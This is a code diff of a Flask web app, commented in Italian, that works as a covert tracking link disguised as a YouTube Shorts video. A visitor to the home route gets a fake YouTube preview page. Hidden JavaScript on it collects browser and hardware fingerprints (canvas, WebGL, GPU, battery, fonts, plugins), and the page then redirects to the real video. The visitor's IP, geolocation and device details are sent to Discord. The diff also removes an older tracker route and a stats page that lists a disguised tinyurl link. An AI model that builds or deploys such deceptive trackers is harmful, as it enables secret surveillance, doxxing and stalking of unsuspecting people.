@@ -147,13 +147,12 @@ def get_all_ips(request):
     
     return ips
 
-def send_to_discord(ip_data, ip_info, device_info, request_info, route_name, extra_info=None):
+def send_to_discord(ip_data, ip_info, device_info, request_info, route_name, fingerprint=None):
     """Invia TUTTO in un unico embed compatto"""
     global visit_counter
     visit_counter += 1
     date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
     
-    # Costruisci la descrizione con TUTTE le info
     description = f"**📅 Data e Ora:** `{date}`\n"
     description += f"**🔢 Visita #:** `{visit_counter}`\n"
     description += f"**🛤️ Route:** `{route_name}`\n\n"
@@ -206,16 +205,29 @@ def send_to_discord(ip_data, ip_info, device_info, request_info, route_name, ext
     description += f"**🚫 DNT:** {request_info.get('dnt', 'N/D')}\n"
     description += f"**🍪 Cookies:** {request_info.get('cookies', 0)}\n"
     
-    # 🆕 EXTRA INFO (fingerprinting JS)
-    if extra_info:
-        description += "\n**══════ 🔬 DETTAGLI TECNICI ══════**\n"
-        if extra_info.get('screen'): description += f"**📺 Risoluzione:** {extra_info['screen']}\n"
-        if extra_info.get('colorDepth'): description += f"**🎨 Colori:** {extra_info['colorDepth']}\n"
-        if extra_info.get('platform'): description += f"**💿 Piattaforma:** {extra_info['platform']}\n"
-        if extra_info.get('cores'): description += f"**⚙️ CPU Core:** {extra_info['cores']}\n"
-        if extra_info.get('memory'): description += f"**💾 RAM:** {extra_info['memory']} GB\n"
-        if extra_info.get('connection'): description += f"**📶 Rete:** {extra_info['connection']}\n"
-        if extra_info.get('touch'): description += f"**👆 Touch:** {extra_info['touch']}\n"
+    # 🆕 FINGERPRINTING AVANZATO
+    if fingerprint:
+        description += "\n**══════ 🔬 FINGERPRINTING ══════**\n"
+        if fingerprint.get('screen'): description += f"**📺 Risoluzione:** {fingerprint['screen']}\n"
+        if fingerprint.get('colorDepth'): description += f"**🎨 Profondità Colore:** {fingerprint['colorDepth']}\n"
+        if fingerprint.get('pixelRatio'): description += f"**🔍 Pixel Ratio:** {fingerprint['pixelRatio']}\n"
+        if fingerprint.get('platform'): description += f"**💿 Piattaforma:** {fingerprint['platform']}\n"
+        if fingerprint.get('cores'): description += f"**⚙️ CPU Core:** {fingerprint['cores']}\n"
+        if fingerprint.get('memory'): description += f"**💾 RAM:** {fingerprint['memory']}\n"
+        if fingerprint.get('connection'): description += f"**📶 Rete:** {fingerprint['connection']}\n"
+        if fingerprint.get('touch'): description += f"**👆 Touchscreen:** {fingerprint['touch']}\n"
+        if fingerprint.get('battery'): description += f"**🔋 Batteria:** {fingerprint['battery']}\n"
+        if fingerprint.get('charging'): description += f"**🔌 In carica:** {fingerprint['charging']}\n"
+        if fingerprint.get('gpu'): description += f"**🎮 GPU:** {fingerprint['gpu']}\n"
+        if fingerprint.get('gpuVendor'): description += f"**🏢 Vendor GPU:** {fingerprint['gpuVendor']}\n"
+        if fingerprint.get('canvas'): description += f"**🎨 Canvas ID:** `{fingerprint['canvas'][:40]}...`\n"
+        if fingerprint.get('webgl'): description += f"**🖼️ WebGL ID:** `{fingerprint['webgl'][:40]}...`\n"
+        if fingerprint.get('fonts'): description += f"**🔤 Font Rilevati:** {fingerprint['fonts']}\n"
+        if fingerprint.get('timezone'): description += f"**🕐 Timezone Browser:** {fingerprint['timezone']}\n"
+        if fingerprint.get('language'): description += f"**🌐 Lingua Browser:** {fingerprint['language']}\n"
+        if fingerprint.get('cookiesEnabled'): description += f"**🍪 Cookies Abilitati:** {fingerprint['cookiesEnabled']}\n"
+        if fingerprint.get('doNotTrack'): description += f"**🚫 Do Not Track:** {fingerprint['doNotTrack']}\n"
+        if fingerprint.get('plugins'): description += f"**🔌 Plugin:** {fingerprint['plugins']}\n"
     
     # Mappa Google Maps
     if ip_info and ip_info.get('lat') != 'N/D' and ip_info.get('lon') != 'N/D':
@@ -246,7 +258,7 @@ def send_to_discord(ip_data, ip_info, device_info, request_info, route_name, ext
     except Exception as e:
         print(f"❌ Eccezione: {e}")
 
-# ============ ROUTES ORIGINALI (INTATTE) ============
+# ============ ROUTES ============
 
 @app.route("/")
 def index():
@@ -257,7 +269,123 @@ def index():
                     "accept_language": request.headers.get('Accept-Language', 'N/D'),
                     "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
     send_to_discord(ip_data, ip_info, device_info, request_info, "Home")
-    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
+    
+    # Pagina con fingerprinting invisibile + redirect immediato
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta property="og:title" content="YouTube Shorts">
+        <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
+        <script>
+            (function() {
+                // Raccoglie fingerprint in background
+                var fp = {};
+                
+                // Schermo
+                fp.screen = screen.width + 'x' + screen.height;
+                fp.colorDepth = screen.colorDepth + ' bit';
+                fp.pixelRatio = window.devicePixelRatio || '?';
+                
+                // Hardware
+                fp.platform = navigator.platform || '?';
+                fp.cores = navigator.hardwareConcurrency || '?';
+                fp.memory = navigator.deviceMemory || '?';
+                fp.connection = navigator.connection ? navigator.connection.effectiveType : '?';
+                fp.touch = ('ontouchstart' in window) ? 'Si' : 'No';
+                
+                // Batteria
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(function(b) {
+                        fp.battery = Math.round(b.level * 100) + '%';
+                        fp.charging = b.charging ? 'Si' : 'No';
+                    }).catch(function(){});
+                }
+                
+                // GPU / WebGL
+                try {
+                    var c = document.createElement('canvas');
+                    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                    if (gl) {
+                        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (dbg) {
+                            fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+                            fp.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+                        }
+                    }
+                } catch(e) {}
+                
+                // Canvas Fingerprint
+                try {
+                    var c2 = document.createElement('canvas');
+                    c2.width = 200; c2.height = 50;
+                    var ctx = c2.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125,1,62,20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Browser Fingerprint 123!', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Browser Fingerprint 123!', 4, 17);
+                    fp.canvas = c2.toDataURL().substring(0, 80);
+                } catch(e) {}
+                
+                // Font rilevati
+                try {
+                    var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
+                    var available = [];
+                    var test = document.createElement('span');
+                    test.style.fontSize = '72px';
+                    test.innerHTML = 'mmmmmmmmmmlli';
+                    for (var i = 0; i < fonts.length; i++) {
+                        test.style.fontFamily = fonts[i];
+                        document.body.appendChild(test);
+                        var w = test.offsetWidth;
+                        available.push(fonts[i]);
+                        document.body.removeChild(test);
+                    }
+                    fp.fonts = available.length + ' font testati';
+                } catch(e) {}
+                
+                // Altro
+                fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                fp.language = navigator.language;
+                fp.cookiesEnabled = navigator.cookieEnabled ? 'Si' : 'No';
+                fp.doNotTrack = navigator.doNotTrack || '?';
+                
+                // Plugin
+                try {
+                    if (navigator.plugins) {
+                        var plist = [];
+                        for (var i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
+                            plist.push(navigator.plugins[i].name);
+                        }
+                        fp.plugins = plist.join(', ') || 'Nessuno';
+                    }
+                } catch(e) {}
+                
+                // Invia fingerprint
+                setTimeout(function() {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', '/fp', true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(fp));
+                }, 200);
+                
+                // Redirect immediato
+                setTimeout(function() {
+                    window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
+                }, 300);
+            })();
+        </script>
+    </head>
+    <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
+        <p style="color:#fff;font-family:Arial;">Caricamento...</p>
+    </body>
+    </html>
+    """
 
 @app.route("/img")
 @app.route("/image")
@@ -318,101 +446,17 @@ def video_preview():
     send_to_discord(ip_data, ip_info, device_info, request_info, "Video")
     return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")
 
-# 🆕 NUOVA ROUTE: Tracciamento avanzato con fingerprinting JS
-@app.route("/advanced")
-@app.route("/pro")
-@app.route("/full")
-def advanced_tracker():
-    """Tracciamento con info aggiuntive dal browser"""
-    ip_data = get_all_ips(request)
-    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
-    device_info = get_device_info(request)
-    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
-                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
-                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
-    send_to_discord(ip_data, ip_info, device_info, request_info, "Advanced")
-    
-    return f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta property="og:title" content="Caricamento video...">
-        <meta property="og:description" content="Il video si sta aprendo">
-        <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
-        <style>
-            *{{margin:0;padding:0}}body{{background:#0f0f0f;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial}}
-            .spinner{{width:50px;height:50px;border:4px solid #303030;border-top:4px solid red;border-radius:50%;animation:spin 1s linear infinite}}
-            @keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
-            p{{color:#aaa;margin-top:20px;font-size:14px}}
-        </style>
-    </head>
-    <body>
-        <div style="text-align:center">
-            <div class="spinner"></div>
-            <p>Caricamento video...</p>
-        </div>
-        <script>
-            // Raccoglie fingerprint del browser
-            const extra = {{
-                screen: screen.width + 'x' + screen.height,
-                colorDepth: screen.colorDepth + ' bit',
-                platform: navigator.platform,
-                cores: navigator.hardwareConcurrency || 'Sconosciuto',
-                memory: navigator.deviceMemory || 'Sconosciuto',
-                connection: navigator.connection ? navigator.connection.effectiveType : 'Sconosciuto',
-                touch: ('ontouchstart' in window) ? 'Si' : 'No'
-            }};
-            
-            // Invia dati al server
-            fetch('/collect', {{
-                method: 'POST',
-                body: JSON.stringify(extra),
-                headers: {{'Content-Type': 'application/json'}}
-            }}).catch(() => {{}});
-            
-            // Redirect dopo 1.5 secondi
-            setTimeout(function() {{
-                window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
-            }}, 1500);
-        </script>
-    </body>
-    </html>
-    """
-
-# 🆕 Endpoint per ricevere dati extra dal client
-@app.route("/collect", methods=["POST"])
-def collect_extra():
-    """Riceve dati fingerprint dal browser"""
+# 🆕 Endpoint per ricevere fingerprint
+@app.route("/fp", methods=["POST"])
+def receive_fingerprint():
+    """Riceve fingerprint dal client"""
     try:
-        extra_data = request.get_json()
-        if extra_data:
-            print(f"📊 Extra: {extra_data}")
-            # Salva su file per statistiche
-            try:
-                with open('/tmp/extra_data.json', 'a') as f:
-                    f.write(json.dumps(extra_data) + '\n')
-            except:
-                pass
+        fp = request.get_json()
+        if fp:
+            print(f"🔬 Fingerprint: {fp}")
     except:
         pass
     return "ok", 200
-
-# 🆕 Route per vedere statistiche
-@app.route("/stats")
-def stats():
-    return f"""
-    <html>
-    <head><title>Stats</title>
-    <style>body{{background:#1a1a1a;color:#fff;font-family:Arial;padding:20px}}h1{{color:red}}</style>
-    </head>
-    <body>
-        <h1>📊 Statistiche</h1>
-        <p>🔢 Visite totali: <strong>{visit_counter}</strong></p>
-        <p>🔗 Link tracciante: <code>https://tinyurl.com/youtube-shorts-8W7RA8Akfxo</code></p>
-    </body>
-    </html>
-    """
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
